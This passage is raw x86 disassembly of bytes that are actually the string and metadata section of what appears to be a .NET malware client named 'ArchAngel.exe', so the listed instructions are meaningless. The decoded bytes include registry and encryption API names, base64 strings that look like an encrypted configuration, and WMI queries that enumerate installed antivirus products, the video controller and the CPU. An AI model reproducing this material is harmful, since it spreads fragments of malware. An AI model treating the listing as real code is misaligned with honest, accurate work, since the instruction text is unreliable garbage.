  408aa1:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa2:	74 55                	je     0x408af9
  408aa4:	73 65                	jae    0x408b0b
  408aa6:	72 00                	jb     0x408aa8
  408aa8:	52                   	push   %edx
  408aa9:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408ab0:	4b 65 
  408ab2:	79 50                	jns    0x408b04
  408ab4:	65 72 6d             	gs jb  0x408b24
  408ab7:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408abe:	68 65 63 6b 00       	push   $0x6b6365
  408ac3:	43                   	inc    %ebx
  408ac4:	72 65                	jb     0x408b2b
  408ac6:	61                   	popa
  408ac7:	74 65                	je     0x408b2e
  408ac9:	53                   	push   %ebx
  408aca:	75 62                	jne    0x408b2e
  408acc:	4b                   	dec    %ebx
  408acd:	65 79 00             	gs jns 0x408ad0
  408ad0:	52                   	push   %edx
  408ad1:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  408ad8:	56 61 
  408ada:	6c                   	insb   (%dx),%es:(%edi)
  408adb:	75 65                	jne    0x408b42
  408add:	4b                   	dec    %ebx
  408ade:	69 6e 64 00 43 68 61 	imul   $0x61684300,0x64(%esi),%ebp
  408ae5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ae6:	67 65 54             	addr16 gs push %esp
  408ae9:	79 70                	jns    0x408b5b
  408aeb:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  408aef:	74 43                	je     0x408b34
  408af1:	6f                   	outsl  %ds:(%esi),(%dx)
  408af2:	6e                   	outsb  %ds:(%esi),(%dx)
  408af3:	76 65                	jbe    0x408b5a
  408af5:	72 74                	jb     0x408b6b
  408af7:	65 72 00             	gs jb  0x408afa
  408afa:	53                   	push   %ebx
  408afb:	79 73                	jns    0x408b70
  408afd:	74 65                	je     0x408b64
  408aff:	6d                   	insl   (%dx),%es:(%edi)
  408b00:	2e 49                	cs dec %ecx
  408b02:	4f                   	dec    %edi
  408b03:	2e 43                	cs inc %ebx
  408b05:	6f                   	outsl  %ds:(%esi),(%dx)
  408b06:	6d                   	insl   (%dx),%es:(%edi)
  408b07:	70 72                	jo     0x408b7b
  408b09:	65 73 73             	gs jae 0x408b7f
  408b0c:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  408b13:	70 53                	jo     0x408b68
  408b15:	74 72                	je     0x408b89
  408b17:	65 61                	gs popa
  408b19:	6d                   	insl   (%dx),%es:(%edi)
  408b1a:	00 43 6f             	add    %al,0x6f(%ebx)
  408b1d:	6d                   	insl   (%dx),%es:(%edi)
  408b1e:	70 72                	jo     0x408b92
  408b20:	65 73 73             	gs jae 0x408b96
  408b23:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408b2a:	00 53 75             	add    %dl,0x75(%ebx)
  408b2d:	62 74 72 61          	bound  %esi,0x61(%edx,%esi,2)
  408b31:	63 74 4f 62          	arpl   %esi,0x62(%edi,%ecx,2)
  408b35:	6a 65                	push   $0x65
  408b37:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  408b3b:	72 65                	jb     0x408ba2
  408b3d:	61                   	popa
  408b3e:	74 65                	je     0x408ba5
  408b40:	45                   	inc    %ebp
  408b41:	6e                   	outsb  %ds:(%esi),(%dx)
  408b42:	63 72 79             	arpl   %esi,0x79(%edx)
  408b45:	70 74                	jo     0x408bbb
  408b47:	6f                   	outsl  %ds:(%esi),(%dx)
  408b48:	72 00                	jb     0x408b4a
  408b4a:	53                   	push   %ebx
  408b4b:	48                   	dec    %eax
  408b4c:	43                   	inc    %ebx
  408b4d:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4e:	72 65                	jb     0x408bb5
  408b50:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408b53:	6c                   	insb   (%dx),%es:(%edi)
  408b54:	00 53 74             	add    %dl,0x74(%ebx)
  408b57:	72 75                	jb     0x408bce
  408b59:	63 74 4c 61          	arpl   %esi,0x61(%esp,%ecx,2)
  408b5d:	79 6f                	jns    0x408bce
  408b5f:	75 74                	jne    0x408bd5
  408b61:	41                   	inc    %ecx
  408b62:	74 74                	je     0x408bd8
  408b64:	72 69                	jb     0x408bcf
  408b66:	62 75 74             	bound  %esi,0x74(%ebp)
  408b69:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  408b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b6f:	75 74                	jne    0x408be5
  408b71:	4b                   	dec    %ebx
  408b72:	69 6e 64 00 43 6f 6d 	imul   $0x6d6f4300,0x64(%esi),%ebp
  408b79:	70 69                	jo     0x408be4
  408b7b:	6c                   	insb   (%dx),%es:(%edi)
  408b7c:	61                   	popa
  408b7d:	74 69                	je     0x408be8
  408b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b80:	6e                   	outsb  %ds:(%esi),(%dx)
  408b81:	52                   	push   %edx
  408b82:	65 6c                	gs insb (%dx),%es:(%edi)
  408b84:	61                   	popa
  408b85:	78 61                	js     0x408be8
  408b87:	74 69                	je     0x408bf2
  408b89:	6f                   	outsl  %ds:(%esi),(%dx)
  408b8a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8b:	73 41                	jae    0x408bce
  408b8d:	74 74                	je     0x408c03
  408b8f:	72 69                	jb     0x408bfa
  408b91:	62 75 74             	bound  %esi,0x74(%ebp)
  408b94:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408b98:	6e                   	outsb  %ds:(%esi),(%dx)
  408b99:	74 69                	je     0x408c04
  408b9b:	6d                   	insl   (%dx),%es:(%edi)
  408b9c:	65 43                	gs inc %ebx
  408b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b9f:	6d                   	insl   (%dx),%es:(%edi)
  408ba0:	70 61                	jo     0x408c03
  408ba2:	74 69                	je     0x408c0d
  408ba4:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408ba7:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408bae:	69 
  408baf:	62 75 74             	bound  %esi,0x74(%ebp)
  408bb2:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  408bb6:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  408bbd:	62 
  408bbe:	75 74                	jne    0x408c34
  408bc0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408bc4:	73 65                	jae    0x408c2b
  408bc6:	6d                   	insl   (%dx),%es:(%edi)
  408bc7:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408bcb:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  408bd2:	69 
  408bd3:	6f                   	outsl  %ds:(%esi),(%dx)
  408bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd5:	41                   	inc    %ecx
  408bd6:	74 74                	je     0x408c4c
  408bd8:	72 69                	jb     0x408c43
  408bda:	62 75 74             	bound  %esi,0x74(%ebp)
  408bdd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408be1:	73 65                	jae    0x408c48
  408be3:	6d                   	insl   (%dx),%es:(%edi)
  408be4:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408be8:	72 61                	jb     0x408c4b
  408bea:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408bed:	61                   	popa
  408bee:	72 6b                	jb     0x408c5b
  408bf0:	41                   	inc    %ecx
  408bf1:	74 74                	je     0x408c67
  408bf3:	72 69                	jb     0x408c5e
  408bf5:	62 75 74             	bound  %esi,0x74(%ebp)
  408bf8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408bfc:	73 65                	jae    0x408c63
  408bfe:	6d                   	insl   (%dx),%es:(%edi)
  408bff:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408c03:	6f                   	outsl  %ds:(%esi),(%dx)
  408c04:	70 79                	jo     0x408c7f
  408c06:	72 69                	jb     0x408c71
  408c08:	67 68 74 41 74 74    	addr16 push $0x74744174
  408c0e:	72 69                	jb     0x408c79
  408c10:	62 75 74             	bound  %esi,0x74(%ebp)
  408c13:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408c17:	73 65                	jae    0x408c7e
  408c19:	6d                   	insl   (%dx),%es:(%edi)
  408c1a:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408c1e:	72 6f                	jb     0x408c8f
  408c20:	64 75 63             	fs jne 0x408c86
  408c23:	74 41                	je     0x408c66
  408c25:	74 74                	je     0x408c9b
  408c27:	72 69                	jb     0x408c92
  408c29:	62 75 74             	bound  %esi,0x74(%ebp)
  408c2c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408c30:	73 65                	jae    0x408c97
  408c32:	6d                   	insl   (%dx),%es:(%edi)
  408c33:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408c37:	6f                   	outsl  %ds:(%esi),(%dx)
  408c38:	6d                   	insl   (%dx),%es:(%edi)
  408c39:	70 61                	jo     0x408c9c
  408c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3c:	79 41                	jns    0x408c7f
  408c3e:	74 74                	je     0x408cb4
  408c40:	72 69                	jb     0x408cab
  408c42:	62 75 74             	bound  %esi,0x74(%ebp)
  408c45:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408c49:	73 65                	jae    0x408cb0
  408c4b:	6d                   	insl   (%dx),%es:(%edi)
  408c4c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408c50:	65 73 63             	gs jae 0x408cb6
  408c53:	72 69                	jb     0x408cbe
  408c55:	70 74                	jo     0x408ccb
  408c57:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408c5e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408c65:	73 73                	jae    0x408cda
  408c67:	65 6d                	gs insl (%dx),%es:(%edi)
  408c69:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408c6d:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408c74:	72 
  408c75:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408c7c:	72 63                	jb     0x408ce1
  408c7e:	68 41 6e 67 65       	push   $0x65676e41
  408c83:	6c                   	insb   (%dx),%es:(%edi)
  408c84:	00 41 72             	add    %al,0x72(%ecx)
  408c87:	63 68 41             	arpl   %ebp,0x41(%eax)
  408c8a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8b:	67 65 6c             	gs insb (%dx),%es:(%di)
  408c8e:	2e 65 78 65          	cs js,pn 0x408cf7
  408c92:	00 00                	add    %al,(%eax)
  408c94:	00 80 81 39 00 77    	add    %al,0x77003981(%eax)
  408c9a:	00 34 00             	add    %dh,(%eax,%eax,1)
  408c9d:	33 00                	xor    (%eax),%eax
  408c9f:	66 00 68 00          	data16 add %ch,0x0(%eax)
  408ca3:	38 00                	cmp    %al,(%eax)
  408ca5:	73 00                	jae    0x408ca7
  408ca7:	5a                   	pop    %edx
  408ca8:	00 31                	add    %dh,(%ecx)
  408caa:	00 77 00             	add    %dh,0x0(%edi)
  408cad:	58                   	pop    %eax
  408cae:	00 79 00             	add    %bh,0x0(%ecx)
  408cb1:	77 00                	ja     0x408cb3
  408cb3:	52                   	push   %edx
  408cb4:	00 72 00             	add    %dh,0x0(%edx)
  408cb7:	39 00                	cmp    %eax,(%eax)
  408cb9:	4a                   	dec    %edx
  408cba:	00 34 00             	add    %dh,(%eax,%eax,1)
  408cbd:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  408cc0:	00 36                	add    %dh,(%esi)
  408cc2:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  408cc6:	00 34 00             	add    %dh,(%eax,%eax,1)
  408cc9:	45                   	inc    %ebp
  408cca:	00 33                	add    %dh,(%ebx)
  408ccc:	00 5a 00             	add    %bl,0x0(%edx)
  408ccf:	7a 00                	jp     0x408cd1
  408cd1:	4b                   	dec    %ebx
  408cd2:	00 68 00             	add    %ch,0x0(%eax)
  408cd5:	2b 00                	sub    (%eax),%eax
  408cd7:	73 00                	jae    0x408cd9
  408cd9:	52                   	push   %edx
  408cda:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  408cde:	00 32                	add    %dh,(%edx)
  408ce0:	00 62 00             	add    %ah,0x0(%edx)
  408ce3:	46                   	inc    %esi
  408ce4:	00 62 00             	add    %ah,0x0(%edx)
  408ce7:	51                   	push   %ecx
  408ce8:	00 41 00             	add    %al,0x0(%ecx)
  408ceb:	56                   	push   %esi
  408cec:	00 43 00             	add    %al,0x0(%ebx)
  408cef:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf0:	00 4b 00             	add    %cl,0x0(%ebx)
  408cf3:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  408cf7:	6d                   	insl   (%dx),%es:(%edi)
  408cf8:	00 2b                	add    %ch,(%ebx)
  408cfa:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  408cfe:	00 39                	add    %bh,(%ecx)
  408d00:	00 61 00             	add    %ah,0x0(%ecx)
  408d03:	4d                   	dec    %ebp
  408d04:	00 69 00             	add    %ch,0x0(%ecx)
  408d07:	5a                   	pop    %edx
  408d08:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  408d0c:	00 72 00             	add    %dh,0x0(%edx)
  408d0f:	38 00                	cmp    %al,(%eax)
  408d11:	78 00                	js     0x408d13
  408d13:	35 00 46 00 00       	xor    $0x4600,%eax
  408d18:	31 48 00             	xor    %ecx,0x0(%eax)
  408d1b:	49                   	dec    %ecx
  408d1c:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  408d20:	00 39                	add    %bh,(%ecx)
  408d22:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  408d26:	00 6b 00             	add    %ch,0x0(%ebx)
  408d29:	2b 00                	sub    (%eax),%eax
  408d2b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2c:	00 4a 00             	add    %cl,0x0(%edx)
  408d2f:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  408d33:	76 00                	jbe    0x408d35
  408d35:	72 00                	jb     0x408d37
  408d37:	57                   	push   %edi
  408d38:	00 79 00             	add    %bh,0x0(%ecx)
  408d3b:	31 00                	xor    %eax,(%eax)
  408d3d:	33 00                	xor    (%eax),%eax
  408d3f:	6d                   	insl   (%dx),%es:(%edi)
  408d40:	00 2f                	add    %ch,(%edi)
  408d42:	00 67 00             	add    %ah,0x0(%edi)
  408d45:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  408d4a:	31 4d 00             	xor    %ecx,0x0(%ebp)
  408d4d:	4b                   	dec    %ebx
  408d4e:	00 72 00             	add    %dh,0x0(%edx)
  408d51:	55                   	push   %ebp
  408d52:	00 75 00             	add    %dh,0x0(%ebp)
  408d55:	75 00                	jne    0x408d57
  408d57:	51                   	push   %ecx
  408d58:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  408d5c:	00 73 00             	add    %dh,0x0(%ebx)
  408d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d60:	00 2f                	add    %ch,(%edi)
  408d62:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  408d66:	00 47 00             	add    %al,0x0(%edi)
  408d69:	56                   	push   %esi
  408d6a:	00 45 00             	add    %al,0x0(%ebp)
  408d6d:	58                   	pop    %eax
  408d6e:	00 45 00             	add    %al,0x0(%ebp)
  408d71:	59                   	pop    %ecx
  408d72:	00 75 00             	add    %dh,0x0(%ebp)
  408d75:	41                   	inc    %ecx
  408d76:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  408d7c:	31 45 00             	xor    %eax,0x0(%ebp)
  408d7f:	79 00                	jns    0x408d81
  408d81:	41                   	inc    %ecx
  408d82:	00 73 00             	add    %dh,0x0(%ebx)
  408d85:	34 00                	xor    $0x0,%al
  408d87:	75 00                	jne    0x408d89
  408d89:	79 00                	jns    0x408d8b
  408d8b:	58                   	pop    %eax
  408d8c:	00 55 00             	add    %dl,0x0(%ebp)
  408d8f:	4b                   	dec    %ebx
  408d90:	00 53 00             	add    %dl,0x0(%ebx)
  408d93:	61                   	popa
  408d94:	00 2b                	add    %ch,(%ebx)
  408d96:	00 2f                	add    %ch,(%edi)
  408d98:	00 38                	add    %bh,(%eax)
  408d9a:	00 73 00             	add    %dh,0x0(%ebx)
  408d9d:	4f                   	dec    %edi
  408d9e:	00 53 00             	add    %dl,0x0(%ebx)
  408da1:	63 00                	arpl   %eax,(%eax)
  408da3:	6a 00                	push   $0x0
  408da5:	6e                   	outsb  %ds:(%esi),(%dx)
  408da6:	00 77 00             	add    %dh,0x0(%edi)
  408da9:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  408dae:	31 43 00             	xor    %eax,0x0(%ebx)
  408db1:	5a                   	pop    %edx
  408db2:	00 78 00             	add    %bh,0x0(%eax)
  408db5:	50                   	push   %eax
  408db6:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  408dba:	00 6e 00             	add    %ch,0x0(%esi)
  408dbd:	73 00                	jae    0x408dbf
  408dbf:	56                   	push   %esi
  408dc0:	00 49 00             	add    %cl,0x0(%ecx)
  408dc3:	58                   	pop    %eax
  408dc4:	00 7a 00             	add    %bh,0x0(%edx)
  408dc7:	39 00                	cmp    %eax,(%eax)
  408dc9:	73 00                	jae    0x408dcb
  408dcb:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  408dcf:	32 00                	xor    (%eax),%al
  408dd1:	61                   	popa
  408dd2:	00 4e 00             	add    %cl,0x0(%esi)
  408dd5:	34 00                	xor    $0x0,%al
  408dd7:	50                   	push   %eax
  408dd8:	00 67 00             	add    %ah,0x0(%edi)
  408ddb:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  408de0:	21 79 00             	and    %edi,0x0(%ecx)
  408de3:	58                   	pop    %eax
  408de4:	00 42 00             	add    %al,0x0(%edx)
  408de7:	62 00                	bound  %eax,(%eax)
  408de9:	55                   	push   %ebp
  408dea:	00 33                	add    %dh,(%ebx)
  408dec:	00 38                	add    %bh,(%eax)
  408dee:	00 67 00             	add    %ah,0x0(%edi)
  408df1:	79 00                	jns    0x408df3
  408df3:	4b                   	dec    %ebx
  408df4:	00 6f 00             	add    %ch,0x0(%edi)
  408df7:	73 00                	jae    0x408df9
  408df9:	44                   	inc    %esp
  408dfa:	00 52 00             	add    %dl,0x0(%edx)
  408dfd:	35 00 64 00 00       	xor    $0x6400,%eax
  408e02:	09 74 00 65          	or     %esi,0x65(%eax,%eax,1)
  408e06:	00 6d 00             	add    %ch,0x0(%ebp)
  408e09:	70 00                	jo     0x408e0b
  408e0b:	00 11                	add    %dl,(%ecx)
  408e0d:	5c                   	pop    %esp
  408e0e:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  408e12:	00 67 00             	add    %ah,0x0(%edi)
  408e15:	2e 00 74 00 6d       	add    %dh,%cs:0x6d(%eax,%eax,1)
  408e1a:	00 70 00             	add    %dh,0x0(%eax)
  408e1d:	00 09                	add    %cl,(%ecx)
  408e1f:	49                   	dec    %ecx
  408e20:	00 4e 00             	add    %cl,0x0(%esi)
  408e23:	46                   	inc    %esi
  408e24:	00 4f 00             	add    %cl,0x0(%edi)
  408e27:	00 13                	add    %dl,(%ebx)
  408e29:	4d                   	dec    %ebp
  408e2a:	00 69 00             	add    %ch,0x0(%ecx)
  408e2d:	63 00                	arpl   %eax,(%eax)
  408e2f:	72 00                	jb     0x408e31
  408e31:	6f                   	outsl  %ds:(%esi),(%dx)
  408e32:	00 73 00             	add    %dh,0x0(%ebx)
  408e35:	6f                   	outsl  %ds:(%esi),(%dx)
  408e36:	00 66 00             	add    %ah,0x0(%esi)
  408e39:	74 00                	je     0x408e3b
  408e3b:	00 19                	add    %bl,(%ecx)
  408e3d:	53                   	push   %ebx
  408e3e:	00 65 00             	add    %ah,0x0(%ebp)
  408e41:	72 00                	jb     0x408e43
  408e43:	76 00                	jbe    0x408e45
  408e45:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  408e4b:	20 00                	and    %al,(%eax)
  408e4d:	50                   	push   %eax
  408e4e:	00 61 00             	add    %ah,0x0(%ecx)
  408e51:	63 00                	arpl   %eax,(%eax)
  408e53:	6b 00 00             	imul   $0x0,(%eax),%eax
  408e56:	05 53 00 50 00       	add    $0x500053,%eax
  408e5b:	00 03                	add    %al,(%ebx)
  408e5d:	20 00                	and    %al,(%eax)
  408e5f:	00 0b                	add    %cl,(%ebx)
  408e61:	46                   	inc    %esi
  408e62:	00 61 00             	add    %ah,0x0(%ecx)
  408e65:	6c                   	insb   (%dx),%es:(%edi)
  408e66:	00 73 00             	add    %dh,0x0(%ebx)
  408e69:	65 00 00             	add    %al,%gs:(%eax)
  408e6c:	0b 33                	or     (%ebx),%esi
  408e6e:	00 32                	add    %dh,(%edx)
  408e70:	00 62 00             	add    %ah,0x0(%edx)
  408e73:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  408e79:	54                   	push   %esp
  408e7a:	00 72 00             	add    %dh,0x0(%edx)
  408e7d:	75 00                	jne    0x408e7f
  408e7f:	65 00 00             	add    %al,%gs:(%eax)
  408e82:	0b 36                	or     (%esi),%esi
  408e84:	00 34 00             	add    %dh,(%eax,%eax,1)
  408e87:	62 00                	bound  %eax,(%eax)
  408e89:	69 00 74 00 00 13    	imul   $0x13000074,(%eax),%eax
  408e8f:	64 00 64 00 2f       	add    %ah,%fs:0x2f(%eax,%eax,1)
  408e94:	00 4d 00             	add    %cl,0x0(%ebp)
  408e97:	4d                   	dec    %ebp
  408e98:	00 2f                	add    %ch,(%edi)
  408e9a:	00 79 00             	add    %bh,0x0(%ecx)
  408e9d:	79 00                	jns    0x408e9f
  408e9f:	79 00                	jns    0x408ea1
  408ea1:	00 0b                	add    %cl,(%ebx)
  408ea3:	45                   	inc    %ebp
  408ea4:	00 72 00             	add    %dh,0x0(%edx)
  408ea7:	72 00                	jb     0x408ea9
  408ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  408eaa:	00 72 00             	add    %dh,0x0(%edx)
  408ead:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  408eb3:	00 2b                	add    %ch,(%ebx)
  408eb5:	5c                   	pop    %esp
  408eb6:	00 72 00             	add    %dh,0x0(%edx)
  408eb9:	6f                   	outsl  %ds:(%esi),(%dx)
  408eba:	00 6f 00             	add    %ch,0x0(%edi)
  408ebd:	74 00                	je     0x408ebf
  408ebf:	5c                   	pop    %esp
  408ec0:	00 53 00             	add    %dl,0x0(%ebx)
  408ec3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408ec7:	75 00                	jne    0x408ec9
  408ec9:	72 00                	jb     0x408ecb
  408ecb:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  408ed1:	43                   	inc    %ebx
  408ed2:	00 65 00             	add    %ah,0x0(%ebp)
  408ed5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408eda:	00 72 00             	add    %dh,0x0(%edx)
  408edd:	32 00                	xor    (%eax),%al
  408edf:	00 3d 53 00 65 00    	add    %bh,0x650053
  408ee5:	6c                   	insb   (%dx),%es:(%edi)
  408ee6:	00 65 00             	add    %ah,0x0(%ebp)
  408ee9:	63 00                	arpl   %eax,(%eax)
  408eeb:	74 00                	je     0x408eed
  408eed:	20 00                	and    %al,(%eax)
  408eef:	2a 00                	sub    (%eax),%al
  408ef1:	20 00                	and    %al,(%eax)
  408ef3:	66 00 72 00          	data16 add %dh,0x0(%edx)
  408ef7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ef8:	00 6d 00             	add    %ch,0x0(%ebp)
  408efb:	20 00                	and    %al,(%eax)
  408efd:	41                   	inc    %ecx
  408efe:	00 6e 00             	add    %ch,0x0(%esi)
  408f01:	74 00                	je     0x408f03
  408f03:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  408f09:	72 00                	jb     0x408f0b
  408f0b:	75 00                	jne    0x408f0d
  408f0d:	73 00                	jae    0x408f0f
  408f0f:	50                   	push   %eax
  408f10:	00 72 00             	add    %dh,0x0(%edx)
  408f13:	6f                   	outsl  %ds:(%esi),(%dx)
  408f14:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  408f18:	00 63 00             	add    %ah,0x0(%ebx)
  408f1b:	74 00                	je     0x408f1d
  408f1d:	00 17                	add    %dl,(%edi)
  408f1f:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  408f23:	73 00                	jae    0x408f25
  408f25:	70 00                	jo     0x408f27
  408f27:	6c                   	insb   (%dx),%es:(%edi)
  408f28:	00 61 00             	add    %ah,0x0(%ecx)
  408f2b:	79 00                	jns    0x408f2d
  408f2d:	4e                   	dec    %esi
  408f2e:	00 61 00             	add    %ah,0x0(%ecx)
  408f31:	6d                   	insl   (%dx),%es:(%edi)
  408f32:	00 65 00             	add    %ah,0x0(%ebp)
  408f35:	00 03                	add    %al,(%ebx)
  408f37:	2c 00                	sub    $0x0,%al
  408f39:	00 09                	add    %cl,(%ecx)
  408f3b:	4e                   	dec    %esi
  408f3c:	00 6f 00             	add    %ch,0x0(%edi)
  408f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f40:	00 65 00             	add    %ah,0x0(%ebp)
  408f43:	00 47 53             	add    %al,0x53(%edi)
  408f46:	00 45 00             	add    %al,0x0(%ebp)
  408f49:	4c                   	dec    %esp
  408f4a:	00 45 00             	add    %al,0x0(%ebp)
  408f4d:	43                   	inc    %ebx
  408f4e:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  408f52:	00 2a                	add    %ch,(%edx)
  408f54:	00 20                	add    %ah,(%eax)
  408f56:	00 46 00             	add    %al,0x0(%esi)
  408f59:	52                   	push   %edx
  408f5a:	00 4f 00             	add    %cl,0x0(%edi)
  408f5d:	4d                   	dec    %ebp
  408f5e:	00 20                	add    %ah,(%eax)
  408f60:	00 57 00             	add    %dl,0x0(%edi)
  408f63:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  408f69:	32 00                	xor    (%eax),%al
  408f6b:	5f                   	pop    %edi
  408f6c:	00 56 00             	add    %dl,0x0(%esi)
  408f6f:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  408f75:	6f                   	outsl  %ds:(%esi),(%dx)
  408f76:	00 43 00             	add    %al,0x0(%ebx)
  408f79:	6f                   	outsl  %ds:(%esi),(%dx)
  408f7a:	00 6e 00             	add    %ch,0x0(%esi)
  408f7d:	74 00                	je     0x408f7f
  408f7f:	72 00                	jb     0x408f81
  408f81:	6f                   	outsl  %ds:(%esi),(%dx)
  408f82:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408f86:	00 65 00             	add    %ah,0x0(%ebp)
  408f89:	72 00                	jb     0x408f8b
  408f8b:	00 09                	add    %cl,(%ecx)
  408f8d:	4e                   	dec    %esi
  408f8e:	00 61 00             	add    %ah,0x0(%ecx)
  408f91:	6d                   	insl   (%dx),%es:(%edi)
  408f92:	00 65 00             	add    %ah,0x0(%ebp)
  408f95:	00 3f                	add    %bh,(%edi)
  408f97:	57                   	push   %edi
  408f98:	00 69 00             	add    %ch,0x0(%ecx)
  408f9b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f9c:	00 33                	add    %dh,(%ebx)
  408f9e:	00 32                	add    %dh,(%edx)
  408fa0:	00 5f 00             	add    %bl,0x0(%edi)
  408fa3:	50                   	push   %eax
  408fa4:	00 72 00             	add    %dh,0x0(%edx)
  408fa7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa8:	00 63 00             	add    %ah,0x0(%ebx)
  408fab:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408faf:	73 00                	jae    0x408fb1
  408fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb2:	00 72 00             	add    %dh,0x0(%edx)
  408fb5:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  408fba:	00 76 00             	add    %dh,0x0(%esi)
  408fbd:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  408fc3:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  408fc9:	22 00                	and    (%eax),%al
  408fcb:	43                   	inc    %ebx
  408fcc:	00 50 00             	add    %dl,0x0(%eax)
  408fcf:	55                   	push   %ebp
  408fd0:	00 30                	add    %dh,(%eax)
  408fd2:	00 22                	add    %ah,(%edx)
  408fd4:	00 00                	add    %al,(%eax)
  408fd6:	07                   	pop    %es
  408fd7:	28 00                	sub    %al,(%eax)
  408fd9:	52                   	push   %edx
  408fda:	00 29                	add    %ch,(%ecx)
  408fdc:	00 00                	add    %al,(%eax)
  408fde:	01 00                	add    %eax,(%eax)
  408fe0:	11 43 00             	adc    %eax,0x0(%ebx)
  408fe3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe4:	00 72 00             	add    %dh,0x0(%edx)
  408fe7:	65 00 28             	add    %ch,%gs:(%eax)
  408fea:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  408fee:	00 29                	add    %ch,(%ecx)
  408ff0:	00 00                	add    %al,(%eax)
  408ff2:	07                   	pop    %es
  408ff3:	43                   	inc    %ebx
  408ff4:	00 50 00             	add    %dl,0x0(%eax)
  408ff7:	55                   	push   %ebp
  408ff8:	00 00                	add    %al,(%eax)
